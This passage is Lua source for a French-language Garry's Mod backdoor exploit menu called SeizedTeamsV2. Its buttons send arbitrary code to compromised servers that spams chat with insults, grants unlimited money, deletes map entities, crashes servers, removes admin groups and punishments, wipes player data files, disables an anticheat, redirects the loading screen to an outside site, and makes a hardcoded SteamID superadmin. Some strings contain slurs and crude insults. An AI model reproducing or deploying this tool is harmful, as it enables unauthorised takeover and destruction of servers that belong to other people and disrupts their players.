    SploitNotify("Super Spam Visuel/Sonore activ�")
    surface.PlaySound("buttons/blip1.wav") 
end

----------------------------------------------------------------------------------SPAM CHAT


local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 140, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 1 - Le LEAK" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat1\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"LE LEAK C'EST PAS BIEN\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Spam 1 - Seized activ�" )
    SploitNotify("SPAM activ� !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 140, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 2 - FDP" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat2\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Tu t'es bien fais niquer fils de pute ! :)\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Spam 2 - Bz fdp activé" )
    SploitNotify("SPAM activ� !")
    surface.PlaySound("buttons/blip1.wav") 
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 3 - Seized by SezeidTeam" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat3\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Hacked By SeizedTeam\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Spam 3 - Get dicked activ�" )
    SploitNotify("SPAM activ� !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller) 
Macro:SetPos( 140, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 4 - Julie Codeuse" )			
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat4\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Julie c'est la meilleur codeuse :D\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Spam 4 - Serveur de merde activ�" )
    SploitNotify("Serveur de merde activ� !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 5 - RIP" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat5\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"RIP RIP RIP RIP\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Spam 5 - RIP activ�	" )
    SploitNotify("SPAM activ� !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam - STOP SPAM" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
timer.Remove ("tchat1")
timer.Remove ("tchat2")
timer.Remove ("tchat3")
timer.Remove ("tchat4")
timer.Remove ("tchat5")
]])
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Stop spam" )
    SploitNotify("SPAM desactive")
    surface.PlaySound("buttons/blip1.wav") 
end

--[[]]
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 30 ) 
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "2D Players" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "2D Players activ�" )
	    SploitNotify("2D players activ� !")
    surface.PlaySound("buttons/blip1.wav") 
        net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 260, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "ARGENT INFINI" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10000000) end) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "10000000 toutes les 0.1sec active." )
    SploitNotify("MONEY MONEY MONEY")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Cleanup" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Map clean up." )
    SploitNotify("Map cleanup !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 260, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Shutdown" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "timer.Create( \"spamlol\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \"Owned by SeizedTeamsV2\") end end)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Arret..." )
    SploitNotify("RIP le serveur :)")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Armageddon" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local faggot = [[
            hook.Add("Think", "armageddon", function()
                local explode = ents.Create( "env_explosion" ) 
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
                    explode:Spawn() 
                    explode:SetKeyValue( "iMagnitude", "500" ) 
                    explode:Fire( "Explode", 0, 0 ) 
                end)  
]]
net.Start(netKey)
net.WriteString( faggot )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Armageddon activ�" )
    SploitNotify("Armageddon activ� !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Nuke" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local nuke = [[
    if( LeyAC ) then
        LeyAC = nil;
    end

timer.Create( "next_level_timer2", 20, 0, function()
    --Break some bad cmds
    local bad = {"Ban","Kick","Kill","KillSilent","GodEnable","GodDisable"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
    --Break ULX
    if ULib then
        for k,v in pairs(player.GetAll()) do
            ULib.ucl.addUser( v:SteamID(), {}, {}, "user" );
        end
 
        for k,v in pairs(ULib.ucl.groups) do
            if k != "user" then
                ULib.ucl.removeGroup(k);
            end
        end
 
        for k,v in pairs(ULib.ucl.users) do
            v.group = "user"
        end
    end
    --Gamemode related
    if GAMEMODE.Name == "DarkRP" then
 
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("rp_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "darkrp_specific_persistence", function( ply )
            RunConsoleCommand("rp_setmoney", ply:Nick(), 0);
        end)
    end
 
    if GAMEMODE.Name == "Trouble in Terrorist Town" then //something here?
        //for k, v in pairs(player.GetAll()) do
        //end
    end
 
    if net.WriteString.find( GAMEMODE.Name:lower(), "stronghold" ) then
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("gbux_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "stronghold_specific_persistence", function( ply )
            RunConsoleCommand("gbux_setmoney", ply:Nick(), 0);
        end)
     
        local fil = file.Find( "data/stronghold/playerinfo/*.txt", "GAME" )
     
        for k, v in pairs( fil ) do
            file.Delete( fil )
        end
    end
end)

if GetConVarnet.WriteString("sv_allowcslua") != "0" then
    RunConsoleCommand( "sv_allowcslua", "1" );
end

hook.Add("Think", "busted", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(2.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)

timer.Create( "next_level_timer", 5, 0, function()
    for k, v in pairs(player.GetAll()) do
        v:ConCommand("say SeizedTeam the best !");
    end
end)

RunConsoleCommand("hostname", "HACK BY IF-BACKDOOR")
RunConsoleCommand( "sv_loadingurl", "http://uu.esy.es/zyqv6r7n/seized.html" )
]]
net.Start(netKey)
net.WriteString( nuke )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "NUKE activer !" )
    SploitNotify("NUKE SERVEUR (�a fail mal)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Taille grande" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local giant = [[
hook.Add("Think", "giant", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(50.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( giant )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Tout le monde grandit ! :o" )
    SploitNotify("Tout le monde est grand !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Taille petite" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local tall = [[
hook.Add("Think", "tall", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(0.2, 80);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( tall )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Tout le monde devient petit :o" )
    SploitNotify("Tout le monde devient petit")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Speedhack" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local speedhack = [[
hook.Add("Think", "speedhack", function()
    for k,v in pairs (player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( speedhack )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "ERREUR, CET EXPLOIT NE FONCTIONNE PAS ! Contacter SeizedTeam christ si l'erreur persite." )
    SploitNotify("Speedhack activ�")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Cancer" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
for k,v in pairs(player.GetAll()) do
    timer.Create("cough", 10, 0, function()
        RunConsoleCommand("say", "*cough*")
        v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
        util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
    end)
end
]])
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Cancer activer" )
    SploitNotify("Cancer activ�")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Earthquake" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
net.Start(netKey)
net.WriteString(" for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end ")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Earthquake activ�" )
    SploitNotify("Eathquake activ� !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Se mettre Superadmin" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:219919521\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin." )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Superadmin Ben" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:219919521\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin" )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Superadmin ALL " )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"Fadmin\", \"setaccess\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin" )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Superadmin manon" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:219919521\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin" )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Superadmin oxalo" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:219919521\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin" )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Superadmin boblepongebgdu49" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:219919521\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin." )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav")
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Superadmin SAM" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:219919521\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin." )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Superadmin Silent" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:219919521\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin." )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Superadmin Hoper" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:219919521\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin." )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
